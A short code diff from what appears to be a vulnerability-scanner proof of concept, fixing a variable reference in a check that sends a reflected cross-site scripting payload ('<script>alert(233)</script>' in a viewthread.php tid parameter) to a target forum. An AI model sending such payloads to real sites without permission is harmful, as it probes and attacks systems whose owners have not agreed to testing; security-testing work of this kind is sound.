@@ -56,7 +56,7 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             payload = '/viewthread.php?tid="/><script>alert(233)</script>'
             verify_url = '{target}{payload}'.format(
-                target=target, payload=payload)
+                target=self.target, payload=payload)
 
             self.output.info('发送验证请求 {}'.format(verify_url))
             req = urllib.request.Request(verify_url)
